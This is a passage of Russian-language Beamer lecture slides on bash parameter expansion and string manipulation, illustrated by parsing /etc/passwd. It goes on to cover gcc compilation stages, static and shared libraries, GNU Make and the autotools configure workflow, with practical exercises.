a="" ; a=''; a=  # null variable
echo ${a}
a="User"         # variable with value
echo ${a}
	\end{lstlisting}
	\end{block}

\end{frame}

\begin{frame}[fragile]
	\frametitle{ Использовать параметр по-умолчанию}

                Занчение параметра остается прежним, только подстановка.
	\begin{block}{\$\{parameter-default\} и \$\{parameter:-default\}}
	\begin{itemize}
		\item '-' использовать default, если переменная не проинициализирована
		\item ':-' использовать default, если переменная не проинициализирована либо пустая
	\end{itemize}
	\begin{lstlisting}
unset VAR
echo ${VAR-test}  # test
echo ${VAR:-test} # test
VAR=""
echo ${VAR-test}  #
echo ${VAR:-test} # test
	\end{lstlisting}
	\end{block}

\end{frame}

\begin{frame}[fragile]
	\frametitle{Установить параметр по-умолчанию}

	Значение по-умолчанию {\bf присваевается} переменной. 

	\begin{block}{\$\{parameter=default\} и \$\{parameter:=default\}}
	\begin{itemize}
		\item '=' устанавливает, если переменная не проинициализирована
		\item ':=' устанавливает, если переменная не проинициализирована либо пустая
	\end{itemize}
	\begin{lstlisting}
unset VAR
${VAR=}
echo ${VAR} # 
${VAR=test}
echo ${VAR} # 
${VAR:=test1}
echo ${VAR} # test1
	\end{lstlisting}
	\end{block}

\end{frame}

\begin{frame}[fragile]
	\frametitle{Заменить параметром по-умолчанию}

	Устанавливает переменной альтернативное значение, если переменная уже проинициализирована.

	\begin{block}{\$\{parameter+default\} и \$\{parameter:+default\}}
	\begin{itemize}
		\item '+' устанавливает, если переменная существует
		\item ':+' устанавливает, если переменная существует и не пуста
	\end{itemize}
	\begin{lstlisting}
VAR=""
echo ${VAR:+test} # 
echo ${VAR+test}  # test
\end{lstlisting}
	\end{block}

\end{frame}


\begin{frame}[fragile]
	\frametitle{Проверить параметр по умолчанию.}

	Выходит с {\tt errorcode=1}.

	\begin{block}{\$\{parameter?message\} и \$\{parameter:?default\}}
	\begin{itemize}
		\item '?' выход, если переменная не существует
		\item ':?' выход , если переменная не существует либо пуста
	\end{itemize}

	\begin{lstlisting}
#!/bin/bash
echo ${VAR?"Не проинициализирована переменная \$VAR!"}
echo ${VAR:?}
echo VAR=$VAR
exit 0
	\end{lstlisting}
	\end{block}
\end{frame}

\begin{frame}[fragile]
	\frametitle{Практическое задание}

	\begin{block}{Задание}
		Удалить переменную {\tt VAR} и запустить скрипт:
		\begin{itemize}
			\item {\tt sh script.sh; echo \$?}
			\item {\tt VAR="" sh script.sh; echo \$?}
			\item {\tt VAR="test" sh script.sh; echo \$?}
		\end{itemize}
	\end{block}
\end{frame}

}
\section{Манипуляции со строками}
\mode<all>{%% Strings manipulation


\begin{frame}
	\frametitle{Переменные -- суть строки}

	\begin{center}
	В shell существует много способов преобразования строк и значений переменной.
	\end{center}

\end{frame}


\begin{frame}[fragile]
	\frametitle{Длина строки}

	\begin{block}{\$\{\#string\}}
	\begin{lstlisting}
string="Embedded Solutions Department"
echo Length=${#string} # Length=29
	\end{lstlisting}
	\end{block}

\end{frame}


\begin{frame}[fragile]
	\frametitle{Извлечение подстроки}

	\begin{block}{\$\{string:position\}}
	\begin{lstlisting}
string="Embedded Solutions Department"
echo ${string:19} # Department
	\end{lstlisting}
	\end{block}

	\pause
	\begin{block}{\$\{string:position:length\}}
	\begin{lstlisting}
string="Embedded Solutions Department"
echo ${string:9:8}  # Solution
	\end{lstlisting}
	\end{block}

\end{frame}

\begin{frame}[fragile]
	\frametitle{Удаление части строки}

	\begin{block}{\$\{string\#substring\} с начала}
	\begin{lstlisting}
entry=$(cat /etc/passwd | grep "^$USER:")
echo $entry # d4s:x:500:500:d4s:/home/d4s:/bin/bash
echo ${entry#*:} # x:500:500:d4s:/home/d4s:/bin/bash
	\end{lstlisting}
	\end{block}

	\pause

	\begin{block}{\$\{string\%substring\} c конца}
	\begin{lstlisting}
entry=$(cat /etc/passwd | grep "^$USER:")
echo $entry # d4s:x:500:500:d4s:/home/d4s:/bin/bash
echo ${entry%:*} # d4s:x:500:500:d4s:/home/d4s 
	\end{lstlisting}
	\end{block}



\end{frame}

\begin{frame}[fragile]
	\frametitle{Удаление части строки}

	\large{Жадное поведение!}

	\begin{block}{\$\{string\#\#substring\}}
	\begin{lstlisting}
entry=$(cat /etc/passwd | grep "^$USER:")
echo $entry # d4s:x:500:500:d4s:/home/d4s:/bin/bash
echo ${entry##*:} # /bin/bash
	\end{lstlisting}
	\end{block}
	\pause
	\begin{block}{\$\{string\%\%substring\}}
	\begin{lstlisting}
entry=$(cat /etc/passwd | grep "^$USER:")
echo $entry # d4s:x:500:500:d4s:/home/d4s:/bin/bash
echo ${entry%%:*} # d4s
	\end{lstlisting}
	\end{block}
\end{frame}


\begin{frame}[fragile]
	\frametitle{Замена части строки}

	\begin{block}{\$\{string/substring/replacement\}}
	\begin{lstlisting}
entry=$(cat /etc/passwd | grep "^$USER:")
echo $entry # d4s:x:500:500:d4s:/home/d4s:/bin/bash
echo ${entry/$USER/user} # user:x:500:500:d4s:/home/d4s:/bin/bash
echo ${entry/$USER} # :x:500:500:d4s:/home/d4s:/bin/bash
	\end{lstlisting}
	\end{block}

	\pause
	\begin{block}{\$\{string//substring/replacement\}}
	\begin{lstlisting}
entry=$(cat /etc/passwd | grep "^$USER:")
echo $entry # d4s:x:500:500:d4s:/home/d4s:/bin/bash
echo ${entry//$USER/user} # user:x:500:500:user:/home/user:/bin/bash
echo ${entry//$USER} # :x:500:500::/home/:/bin/bash
	\end{lstlisting}
	\end{block}

\end{frame}

\begin{frame}[fragile]
	\frametitle{Замена части строки}

	\begin{block}{\$\{string/\#substring/replacement\}}
		Замена, если строка начинается с искомого выражения (префикс).

	\begin{lstlisting}
entry=$(cat /etc/passwd | grep "^$USER:")
echo $entry # d4s:x:500:500:d4s:/home/d4s:/bin/bash
echo ${entry/#$USER/user} # user:x:500:500:d4s:/home/d4s:/bin/bash
	\end{lstlisting}
	\end{block}

	\pause
	\begin{block}{\$\{string/\%substring/replacement\}}
		Замена, если строка завершается искомым выражением (суффикс).

	\begin{lstlisting}
entry=$(cat /etc/passwd | grep "^$USER:")
echo $entry # d4s:x:500:500:d4s:/home/d4s:/bin/bash
echo ${entry/%\/bin\/bash/\/bin\/sh} # user:x:500:500:user:/home/user:/bin/sh
	\end{lstlisting}
	\end{block}

\end{frame}

\begin{frame}[fragile]
	\frametitle{Получение имен переменных}

	\begin{block}{ \$\{!varprefix*\} и \$\{!varprefix@\} }

		Скрипт, который выводит на экран список переменных, начинающихся на {\tt BASH} и их значений:
	\begin{lstlisting}
#!/bin/bash

VARS=${!BASH*}
for VAR in $VARS
do
    echo $VAR=${!VAR}
done
	\end{lstlisting}
	\end{block}
\end{frame}

}
\section{Практическая задача}
\mode<all>{%% Strings manipulation

\begin{frame}[fragile]
	\frametitle{Практическая задача}

	Чтение табличных данных и их преобразование.

	\pause

	Hint: {\tt man 5 passwd}

	\begin{enumerate}
		\item Прочитать все записи из файла {\tt /etc/passwd}
		\item Вывести на экран всех пользователей у которых 
			домашняя директория не {\tt /dev/null} в формате:\\
			"account = homedir"
		\item Оставить от "homedir" только последнее имя
	\end{enumerate}
\end{frame}


\begin{frame}[fragile]
	\frametitle{Пример решения}

	\begin{block}{Шаг 1: Чтение из файла}

	\begin{lstlisting}
cat /etc/passwd | ./script.sh
./script.sh < /etc/passwd
	\end{lstlisting}

	\begin{lstlisting}
#!/bin/bash

exec < /etc/passwd
	\end{lstlisting}

	\end{block}
\end{frame}


\begin{frame}[fragile]
	\frametitle{Пример решения}

	\begin{block}{Шаг 2: Построчное чтение}

	\begin{lstlisting}
while read string
do
    echo $string
done
	\end{lstlisting}

	\end{block}
\end{frame}

\begin{frame}[fragile]
	\frametitle{Пример решения}

	\begin{block}{Шаг 3: Разбиваем строку в таблице на элементы}

	\begin{lstlisting}
IFS=':'
	\end{lstlisting}

	\end{block}
\end{frame}

\begin{frame}[fragile]
	\frametitle{Пример решения}

	\begin{block}{Шаг 4: поэлементное чтение}

	\begin{lstlisting}
while read account password uid gid gecos homedir shell
do
    echo $account = $homedir
done
	\end{lstlisting}

	\end{block}
\end{frame}

\begin{frame}[fragile]
	\frametitle{Пример решения}

	\begin{block}{Шаг 5: выводим не {\tt /dev/null}}

	\begin{lstlisting}
while read account password uid gid gecos homedir shell
do
    [ -z "${homedir/#\/dev\/null}" ] || echo $account = ${homedir}
done
	\end{lstlisting}

	\end{block}
\end{frame}

\begin{frame}[fragile]
	\frametitle{Пример решения}

	\begin{block}{Шаг 5: выводим не {\tt /dev/null}}

	\begin{lstlisting}
while read account password uid gid gecos homedir shell
do
    [ -z "${homedir/#\/dev\/null}" ] || echo $account = ${homedir##*/}
done
	\end{lstlisting}

	\end{block}
\end{frame}


}

\part{Инструменты разработчика}
\chapter{GNU Toolchain}
\section{Компилятор}
\mode<all>{\begin{frame}[fragile]
	\frametitle{GCC}

	\begin{block}{GNU Compiler Collection}

		Языки:

		\begin{itemize}
			\item C
			\item C++
			\item Objective-C
			\item Objective-C++
			\item Java
			\item Fortran
			\item Ada
			\item Go
		\end{itemize}
	\end{block}

\end{frame}



\begin{frame}[fragile]
\frametitle{Компоненты gcc}
\begin{itemize}
  \item Препроцессор
\begin{lstlisting}[language=sh]
gcc -E
\end{lstlisting}
  \item Компилятор (+ассемблер)
\begin{lstlisting}[language=sh]
gcc -S, gcc -c
\end{lstlisting}
  \item Линкер
\begin{lstlisting}[language=sh]
gcc -o myprogram file1.o file2.o -lmylib1 -lmylib2
\end{lstlisting}
\end{itemize}
\end{frame}

\begin{frame}
\frametitle{Упражнение}
\begin{itemize}
  \item Написать программу выводящую {\tt Hello world!} на C
  \item Прогнать стадию препроцессора (helloworld.i)
  \item Скомпилировать helloworld.i в ассемблерный код
  \item Скомпилировать ассемблерный код helloworld.s в объектный код helloworld.o
  \item Слинковать helloworld.o и запустить программу
\end{itemize}
\end{frame}


\begin{frame}
\frametitle{Флаги gcc}

	\begin{block}{Позитивные и негативные формы}
		\begin{itemize}
			\item -ffoo / -fno-foo ({\tt -fno-builtin})
			\item -Wbar / -Wno-bar ({\tt -Wunused-variable})
		\end{itemize}
	\end{block}


	\begin{itemize}
	  \item Debug {\tt -g}
	  \item Предупреждения компилятора {\tt -Wall, -Werror}
	  \item Оптимизация {\tt -O -O1 -O2 -O3 -Os}
      \item Поиск файлов {\tt -I, -L}
	\end{itemize}
\end{frame}

\begin{frame}[fragile]
  \frametitle{Помощь по флагам и опциям}
\begin{lstlisting}[language=sh]
gcc --help=<smth>
\end{lstlisting}
\begin{block}{Некоторые виды опций у \texttt{--help}}
  \begin{itemize}
    \item \texttt{optimizers}
    \item \texttt{warnings}
    \item \texttt{params}
    \item \texttt{targets}
  \end{itemize}
\end{block}
\begin{lstlisting}[language=sh]
gcc -Q -O2 --help=optimizers
gcc -Q -Wall --help=warnings
\end{lstlisting}
\end{frame}

\begin{frame}[fragile]
	\frametitle{GCC environment variables}

	\begin{block}{Компилятор}
		\begin{itemize}
			%\item {\tt CC} -- (пере)определение компилятора
			%\item {\tt CFLAGS} -- флаги для компилятора
		    \item {\tt CPATH, C\_INCLUDE\_PATH} -- расположение включаемых файлов для {\tt -I}
		\end{itemize}
	\end{block}
    \begin{block}{Линкер}
      \begin{itemize}
          \item {\tt LIBRARY\_PATH} -- в режиме линкера, расположение библиотек {\tt -L} 
      \end{itemize}
    \end{block}
\end{frame}

\begin{frame}
	\frametitle{Упражнение}
	\begin{itemize}
		\item Добавить в код неиспользуемую переменную
		\item Скомпилировать объектный файл с установленной опцией {\tt -Wall}
		\item Скомпилировать объектный файл с установленными опциями {\tt -Wall -Werror}
	\end{itemize}
\end{frame}

\begin{frame}
  \frametitle{Доп. упражнение для желающих}
  \begin{itemize}
    \item Скомпилировать \texttt{helloworld.c} в ассемблерный код с опцией \texttt{-fno-builtin} и посмотреть отличия
    \item Выяснить какие флаги оптимизации отличаются при -O2 и -O3 (hint: \texttt{gcc -Q - -help=} и \texttt{diff}
    \item Скомпилировать \texttt{helloworld.c} с \texttt{-fdump-passes}
  \end{itemize}
\end{frame}
}
\section{Линкер}
\mode<all>{\begin{frame}
 \frametitle{Статическая и динамическая линковка}
 \begin{itemize}
   \item Статическая линковка
     \begin{columns}
       \column{0.4\textwidth}
       \begin{center}
         Достоинства 
       \end{center}
       \begin{itemize}
         \item Быстрая загрузка
         \item Большая переносимость
       \end{itemize}
       \column{0.4\textwidth}
       \begin{center}
         Недостатки
       \end{center}
       \begin{itemize}
         \item Много места на диске
         \item Много места в памяти
         \item Перелинковка при изменениях
       \end{itemize}
     \end{columns}
   \item Динамическая линковка
     \begin{columns}
       \column{0.4\textwidth}
       \begin{center}
         Достоинства 
       \end{center}
       \begin{itemize}
         \item Экономия памяти и диска
         \item Не нужна перелинковка
       \end{itemize}
       \column{0.4\textwidth}
       \begin{center}
         Недостатки
       \end{center}
       \begin{itemize}
         \item Медленная загрузка
         \item Структура директорий должна совпадать
       \end{itemize}
        
     \end{columns}
    \item{Линковка во время выполнения}
 \end{itemize}
\end{frame}
\begin{frame}[fragile]
 \frametitle{Создание статических библиотек}
\begin{lstlisting}[language=sh]
gcc -g -Wall -c  file1.c
gcc -g -Wall -c  file2.c
ar rcs libmylib.a file1.o file2.o
#ranlib libmylib.a
gcc -o file3 file3.c -L. -lmylib # Использование
\end{lstlisting}
\end{frame}

\begin{frame}[fragile]
  \frametitle{Создание динамических разделяемых библиотек}
\begin{lstlisting}[language=sh]
gcc -g -fpic -c -Wall   file1.c; gcc -g -Wall -fpic -c  file2.c
gcc -g -shared -Wl,-soname,libmylib.so.0 -o libmylib.so.0.0 
cp libmylib.so.0.0 /usr/local/lib/
ldconfig 
gcc -g -o file3 file3.o -lmylib
\end{lstlisting}
\end{frame}

\begin{frame}
 \frametitle{Проблемы при линковке}
 \begin{itemize}
   \item Underlinking
   \item Зависимость от порядка при опции {\tt --as-needed} 
   \item Overlinking
   \item Несовместимость версий (soname etc.)
 \end{itemize}
\end{frame}

\begin{frame}[fragile]
  \frametitle{Поиск динамических библиотек}
  \begin{itemize}
    \item {\tt -rpath} Опция линкера
    \item \verb+ LD_LIBRARY_PATH +
    \item {\tt ldconfig}
    \item {\tt /etc/ld.so.conf}
    \item {\tt /etc/ld.so.cache}
  \end{itemize}
\end{frame}

\begin{frame}
  \frametitle{Упражнение}
  \begin{itemize}
    \item Оформить функцию {\tt hello(char * user) } которая приветствует пользователя в отдельный файл
    \item Скомпилировать этот файл и создать из него разделяемую динамическую библиотеку {\tt (libhello.so)}
    \item Создать программу вызывающую функцию {\tt hello()} и слинковать ее с динамической библиотекой
  \end{itemize}
\end{frame}
}
\section{GNU/Make}
\mode<all>{\begin{frame}[fragile]
	\frametitle{Библиотека}

	\begin{columns}
		\column{0.5\textwidth}
		{\tt name.h}:

		\begin{lstlisting}
extern char* get_name();
		\end{lstlisting}
		\column{0.5\textwidth}

		{\tt name.c}:

		\begin{lstlisting}
#include "name.h"

char* get_name()
{
    return LIB_NAME;
}
		\end{lstlisting}
	\end{columns}
	
	\begin{center}
	Чего не хватает в хидере? А ещё?
\end{center}
\pause
	\begin{lstlisting}
gcc --shared -o libname.so name.c -DLIB_NAME=\"libname.so\"
	\end{lstlisting}
\end{frame}

\begin{frame}[fragile]
	\frametitle{Программа}

	{\tt hello.с:}

	\begin{lstlisting}
#include <stdio.h>
#include "name.h"

int main(int argc, char** argv)
{
    printf("Hello, %s\n", get_name());
    return 0;
}
	\end{lstlisting}

	Сборка:

	\begin{verbatim}
gcc hello.c -c -o hello.o
gcc hello.o -L=. -lname -o hello
	\end{verbatim}
\end{frame}

\begin{frame}
  \frametitle{Задачи Make}
  \begin{itemize}
     \item Набор правил для сборки сложных проектов одной командой
     \item Поддержание зависимостей
       \begin{itemize}
         \item Пересборка только изменившихся частей
         \item Определение необходимости пересборки
       \end{itemize}
  \end{itemize}
\end{frame}

\begin{frame}[fragile]
	\frametitle{Правила make}

	Общий синтаксис:
	\begin{verbatim}
<target>: <dependency0> <dependency1>
<TAB><command0>
<TAB><command1>
<TAB><command2>
	\end{verbatim}

	Абстрактные цели:
	\begin{verbatim}
.PHONY <target0> ... <targetN>
	\end{verbatim}
\end{frame}

\begin{frame}[fragile]
	\frametitle{Makefile}

	\begin{lstlisting}[language=make]
.PHONY release
release: hello
hello: hello.o libname.so
    gcc hello.o -L=. -lname -o hello

hello.o: hello.c name.h
    gcc hello.c -c -Wall -fPIC -o hello.o

libname.so: name.c
    gcc --shared -o libname.so name.c -DLIB_NAME=\"libname.so\"

name.c: name.h

hello.c: name.h
	\end{lstlisting}
\end{frame}



\begin{frame}[fragile]
	\frametitle{Переменные в Makefile}
	\begin{lstlisting}[language=make]
all_flags = $(compiler_flags) $(linker_flags)
no_flags := $(compiler_flags) $(linker_flags)
compiler_flags = -Wall -O3
linker_flags := -fPIC
compiler_flags += -pipe

show-flags:
    @echo "Compiler flags" $(compiler_flags)
    @echo "Linker flags" $(linker_flags)
    @echo "All flags" $(all_flags)
    @echo "No flags" $(no_flags)
	\end{lstlisting}
\end{frame}
\begin{frame}[fragile]
	\frametitle{Псевдонимы и шаблонные правила}

	\begin{itemize}
		\item {\tt \$@} -- Имя цели обрабатываемого правила
		\item {\tt \$<} -- Имя первой зависимости обрабатываемого правила 
		\item {\tt \$\^{}} -- Список всех зависимостей обрабатываемого правила
	\end{itemize}

	\begin{lstlisting}[language=make]
%.o: %.c
    gcc $^ -o $@

VPATH := . somedir
	\end{lstlisting}
\end{frame}

\begin{frame}[fragile]
\frametitle{Скрытые (implicit) правила}
\begin{block}{Упражнение}
В пустой директории создайте файл hello.c, который выводит hello, world
\begin{lstlisting}[language=bash]
make hello
\end{lstlisting}
\end{block}
\pause
\begin{center}
Некоторые скрытые правила
\end{center}
\begin{lstlisting}[language=make]
%.o:%.c
        $(CC) -c $(CPPFLAGS) $(CFLAGS) $^
%.o:%.cc
        $(CXX) -c $(CPPFLAGS) $(CXXFLAGS) $^
%:%.o
        $(CC) -o $@ $(LDFLAGS) $^ $(LOADLIBES) 
\end{lstlisting}
\end{frame}
\begin{frame}[fragile]
	\frametitle{Функции в make}

	\begin{itemize}
		\item wildcard -- список всех файлов по паттерну,  находящихся в директории проекта
		\item addprefix -- подстановка первого аргумента к каждому слову из второго аргумента
		\item patsubst -- замена в списке
		\item include -- как и {\tt \#include} в {\tt c/c++}
	\end{itemize}

	\begin{lstlisting}[language=make]
src_dirs := core stuff generic
src_dirs := $(addprefix ../../,  $(src_dirs))

$(patsubst %.c, %.o, $(wildcard *.c))
	\end{lstlisting}

\end{frame}

\begin{frame}[fragile]
	\frametitle{Автоматические зависимости}

	Создание зависимостей средствами gcc:

	\begin{verbatim}
gcc -M -MM -MD -MMD
	\end{verbatim}

	\begin{lstlisting}[language=make]
include $(wildcard *.d)
	\end{lstlisting}
\end{frame}
\begin{frame}[fragile]
	\frametitle{Практическое задание}

	\begin{enumerate}
		\item добавьте цель {\tt clean}
		\item перепишите с использованием шаблонных правил
		\item заведите переменные {\tt CFLAGS}, {\tt LDFLAGS}
		\item сохраняйте промежуточные файлы в каталог {\tt out/}
		\item создайте правило {\tt debug:} для сборки в отладочном режиме
	\end{enumerate}
\end{frame}

}

\section{Автоматизация кроссплатформенной поддержки}
TODO: 
\begin{verbatim}
\mode<all>{\begin{frame}
 \frametitle{Иерархия инструментов поддержки проекта}
 \begin{itemize}
   \item \texttt{gcc -c , gcc -o program file1.o file2.o}
     \pause
   \item \texttt{make programm}
     \begin{enumerate}
       \item[Цель] Автоматизация процесса сборки
      \end{enumerate}
     \pause
   \item \texttt{./configure; make; sudo make install}
     \begin{enumerate}
       \item[Цель] Переносимость между платформами
      \end{enumerate}
     \pause
   \item \texttt{autoreconf, automake, libtool, etc.}
     \begin{enumerate}
       \item[Цель] Автоматизация создания переносимых приложений
      \end{enumerate}
 \end{itemize}
\end{frame}

\begin{frame}
  \frametitle{Типичная схема установки пакета соответсвующего стандартам GNU}
  \begin{itemize}
    \item \texttt{configure}, возможно \texttt{configure <options>}
    \item \texttt{make}
    \item \texttt{sudo make install} 
   \end{itemize}
\end{frame}

\begin{frame}
\frametitle{Упрощенная схема работы GNU configure}

%This slide is copyright Alexandre Duret-Lutz, Laboratoire de Recherche et Développement de l'Epita 
%Distributed under CC BY-SA 2.0 license
%Minor changes Yury Adamov, EPAM 
\begin{center}
\begin{tikzpicture}

\dgfile (Makefilein) at (1,5) {\filenamew{Makefile.in}};
\dgfile (src/Makefilein) at (4,5) {\filenamew{src/Makefile.in}};
\dgfile (confighin) at (7,5) {\filenamew{config.h.in}};
\dgfile (configure) at (4,3) {\filenamew{configure}};
\uncover<2->{
\bfile (Makefile) at (1,1) {\filenamew{Makefile}};
\bfile (src/Makefile) at (4,1) {\filenamew{src/Makefile}};
\bfile (configh) at (7,1) {\filenamew{config.h}};

\arr (Makefilein) .. controls +(-90:1cm) and +(180:3cm) .. (configure);
\arr (src/Makefilein) .. controls +(-90:1cm) and +(175:3cm) .. (configure);
\arr (confighin) .. controls +(-90:1cm) and +(170:3cm) .. (configure);

\arr (configure) .. controls +(-10:2.5cm) and +(80:1cm) .. (Makefile);
\arr (configure) .. controls +(-5:2.2cm) and +(85:1cm) .. (src/Makefile);
\arr (configure) .. controls +(0:2cm) and +(90:1cm) .. (configh);
}
\end{tikzpicture}
\end{center}
\footnotesize{ Взято из http://www.lrde.epita.fr/~adl/autotools.html}
\end{frame}

\begin{frame}
\frametitle{Реальная схема работы configure}


\begin{center}
\begin{tikzpicture}

%This slide is copyright Alexandre Duret-Lutz, Laboratoire de Recherche et Développement de l'Epita 
%Distributed under CC BY-SA 2.0 license
%Minor changes Yury Adamov, EPAM 
\dgfile (Makefilein) at (1,5) {\filenamew{Makefile.in}};
\dgfile (src/Makefilein) at (4,5) {\filenamew{src/Makefile.in}};
\dgfile (confighin) at (7,5) {\filenamew{config.h.in}};
\dgfile (configure) at (-.7,4) {\filenamew{configure}};
\uncover<all:2->{\bfile (configlog) at (5.5,2) {\filenamew{config.log}};}
\uncover<all:3->{\bfile (configstatus) at (2.5,3) {\filenamew{config.status}};}

\uncover<all:4->{\bfile (Makefile) at (1,1) {\filenamew{Makefile}};
\bfile (src/Makefile) at (4,1) {\filenamew{src/Makefile}};
\bfile (configh) at (7,1) {\filenamew{config.h}};}
\uncover<all:5->{\bfile (configcache) at (0,2) {\filenamew{config.cache}};}

\uncover<all:2>{\arr[color=red] (configure) .. controls +(10:2cm) and +(80:2cm) .. (configlog);}
\uncover<all:3->{\arr (configure) .. controls +(10:2cm) and +(80:2cm) .. (configlog);}
\uncover<all:3>{\arr[color=red] (configure) .. controls +(0:1cm) and +(90:1cm) .. (configstatus);}
\uncover<all:4->{\arr (configure) .. controls +(0:1cm) and +(90:1cm) .. (configstatus);}
\uncover<all:5>{\arr[color=red] (configure) .. controls +(-10:1.5cm) and +(80:1cm) .. (configcache);
              \arr[color=red] (configcache) .. controls +(-140:2cm) and +(-170:2cm) .. (configure);}
\uncover<all:4>{\arr[color=red] (Makefilein) .. controls +(-90:1cm) and +(180:2.8cm) .. (configstatus);
\arr[color=red] (src/Makefilein) .. controls +(-90:1cm) and +(170:3cm) .. (configstatus);
\arr[color=red] (confighin) .. controls +(-90:1cm) and +(170:3cm) .. (configstatus);

\arr[color=red] (configstatus) .. controls +(-10:3cm) and +(70:1cm) .. (Makefile);
\arr[color=red] (configstatus) .. controls +(-5:2.5cm) and +(90:2cm) .. (src/Makefile);
\arr[color=red] (configstatus) .. controls +(5:2cm) and +(90:2cm) .. (configh);
\arr[color=red] (configstatus) .. controls +(0:2cm) and +(100:.5cm) .. (configlog);
}
\uncover<all:5->{\arr (Makefilein) .. controls +(-90:1cm) and +(180:2.8cm) .. (configstatus);
\arr (src/Makefilein) .. controls +(-90:1cm) and +(170:3cm) .. (configstatus);
\arr (confighin) .. controls +(-90:1cm) and +(170:3cm) .. (configstatus);

\arr (configstatus) .. controls +(-10:3cm) and +(70:1cm) .. (Makefile);
\arr (configstatus) .. controls +(-5:2.5cm) and +(90:2cm) .. (src/Makefile);
\arr (configstatus) .. controls +(5:2cm) and +(90:2cm) .. (configh);
\arr (configstatus) .. controls +(0:2cm) and +(100:.5cm) .. (configlog);
}
\end{tikzpicture}
\footnotesize{ Взято из http://www.lrde.epita.fr/~adl/autotools.html}
\end{center}

\end{frame}



\begin{frame}
 \frametitle{Важные опции configure, требуемые GNU standard}
   Директории
    \begin{enumerate}
     \item[prefix] По дефолту \texttt{/usr/local}
      \begin{enumerate}
         \item[exec-prefix] По дефолту \texttt{prefix}
         \begin{enumerate}
            \item[bindir] По дефолту \texttt{exec-prefix/bin}
            \item[libdir] По дефолту \texttt{exec-prefix/lib}
         \end{enumerate}
         \item[includedir] \texttt{prefix/include}
         \item[datarootdir] \texttt{prefix/share}
         \begin{enumerate}
            \item[mandir]
            \item[datadir]
         \end{enumerate}
      \end{enumerate}
    \end{enumerate}

\end{frame}

\begin{frame}
 \frametitle{Еще важные опции \texttt{configure}}
 \begin{itemize}
   \item \texttt{help}
   \item \texttt{version}
   \item \texttt{with-smth}, \texttt{without-smth} \\
		 \texttt{enable-smth}, \texttt{disable-smth}
  \end{itemize}
\end{frame}


\begin{frame}
  \frametitle{Опции для make}
  \begin{itemize}
    \item \texttt{make all} (просто \texttt{make})
    \item \texttt{make install}
    \item \texttt{make uninstall}
    \item \texttt{make clean}
    \item \texttt{make distclean}
    \item \texttt{make check} Опционально
    \item \texttt{make installcheck} Опционально
    \item \texttt{make dist}
  \end{itemize}
\end{frame}

\begin{frame}
 \frametitle{Упражнение}
 Для упражнения понадобится проект GNU/Hello \url{http://www.gnu.org/software/hello/}.

  \begin{itemize}
    \item Распаковать архив и перейти в созданный каталог
    \item Указать префикс установки GNU/Hello в \texttt{\$HOME/usr/}
	\item Скомпилировать, проверить и установить проект
	\item Запустить c опцией {\tt -{}-help}
    \item Удалить результаты инсталляции
	\item Удалить все автоматически созданные файлы в проекте
	\item Создать в дереве исходников директорию {\tt build} и перейти в нее
	\item Пересобрать проект без поддержки локализации, добавив суффикс
	\item Установить {\it архитектурно-зависимые} файлы GNU/Hello 
		в \texttt{\$HOME/test/} с использованием переменной {\tt DESTDIR}
	\item Запустить c опцией {\tt -{}-help}
  \end{itemize}
\end{frame}

\begin{frame}
\frametitle{Autotools: схема работы}

%This slide is copyright Alexandre Duret-Lutz, Laboratoire de Recherche et Développement de l'Epita 
%Distributed under CC BY-SA 2.0 license
%Minor changes Yury Adamov, EPAM 
\only<all:1-2>{\begin{center}
\begin{tikzpicture}

\dgfile (Makefilein) at (1,5) {\filenamew{Makefile.in}};
\dgfile (src/Makefilein) at (4,5) {\filenamew{src/Makefile.in}};
\dgfile (confighin) at (7,5) {\filenamew{config.h.in}};
\dgfile (configure) at (-.7,4) {\filenamew{configure}};
\uncover<all:1>{\bfile (config.log) at (5.5,2) {\filenamew{config.log}};
\bfile (configstatus) at (2.5,3) {\filenamew{config.status}};

\bfile (Makefile) at (1,1) {\filenamew{Makefile}};
\bfile (src/Makefile) at (4,1) {\filenamew{src/Makefile}};
\bfile (configh) at (7,1) {\filenamew{config.h}};
\bfile (configcache) at (0,2) {\filenamew{config.cache}};

\arr (configure) .. controls +(10:2cm) and +(80:2cm) .. (configlog);
\arr (configure) .. controls +(0:1cm) and +(90:1cm) .. (configstatus);
\arr (configure) .. controls +(-10:1.5cm) and +(80:1cm) .. (configcache);
\arr (configcache) .. controls +(-140:2cm) and +(-170:2cm) .. (configure);

\arr (Makefilein) .. controls +(-90:1cm) and +(180:2.8cm) .. (configstatus);
\arr (src/Makefilein) .. controls +(-90:1cm) and +(175:3.2cm) .. (configstatus);
\arr (confighin) .. controls +(-90:1cm) and +(170:3cm) .. (configstatus);

\arr (configstatus) .. controls +(-10:3cm) and +(70:1cm) .. (Makefile);
\arr (configstatus) .. controls +(-5:2.5cm) and +(90:1cm) .. (src/Makefile);
\arr (configstatus) .. controls +(5:2cm) and +(90:2cm) .. (configh);
\arr (configstatus) .. controls +(0:2cm) and +(100:.5cm) .. (configlog);
}
\end{tikzpicture}
\end{center}}
\only<all:3->{\begin{center}
\begin{tikzpicture}{-3.5cm}{3cm}{8cm}{9cm}
\dgfile (Makefilein) at (1,5) {\filenamew{Makefile.in}};
\dgfile (src/Makefilein) at (4,5) {\filenamew{src/Makefile.in}};
\dgfile (confighin) at (7,5) {\filenamew{config.h.in}};
\dgfile (configure) at (-.5,4) {\filenamew{configure}};
\uncover<all:4->{
\tfile (autoreconf) at (2.5,6.5) {\command{autoreconf}};
\afile (configureac) at (-2,8) {\filenamew{configure.ac}};
}
\uncover<all:5->{
\afile (Makefileam) at (1,8) {\filenamew{Makefile.am}};
\afile (src/Makefileam) at (4,8) {\filenamew{src/Makefile.am}};
}
\uncover<all:4->{
\arr (configureac) .. controls +(-90:2cm) and +(185:4cm) .. (autoreconf);
\arr (autoreconf) .. controls +(-10:4cm) and +(100:2.7cm) .. (configure);
\arr (autoreconf) .. controls +(5:4cm) and +(90:1cm) .. (confighin);
}
\uncover<all:5->{
\arr (Makefileam) .. controls +(-90:.8cm) and +(178:3cm) .. (autoreconf);
\arr (src/Makefileam) .. controls +(-90:.6cm) and +(170:3cm) .. (autoreconf);
\arr (autoreconf) .. controls +(-5:4cm) and +(55:.5cm) .. (Makefilein);
\arr (autoreconf) .. controls +(0:3cm) and +(70:.5cm) .. (src/Makefilein);
}
\end{tikzpicture}
\end{center}}

\footnotesize{ Взято из http://www.lrde.epita.fr/~adl/autotools.html}
\end{frame}

\begin{frame}
\frametitle{Леденящие душу подробности \command{autoreconf}}
%This slide is copyright Alexandre Duret-Lutz, Laboratoire de Recherche et Développement de l'Epita 
%Distributed under CC BY-SA 2.0 license
%Minor changes Yury Adamov, EPAM 
\begin{tikzpicture}
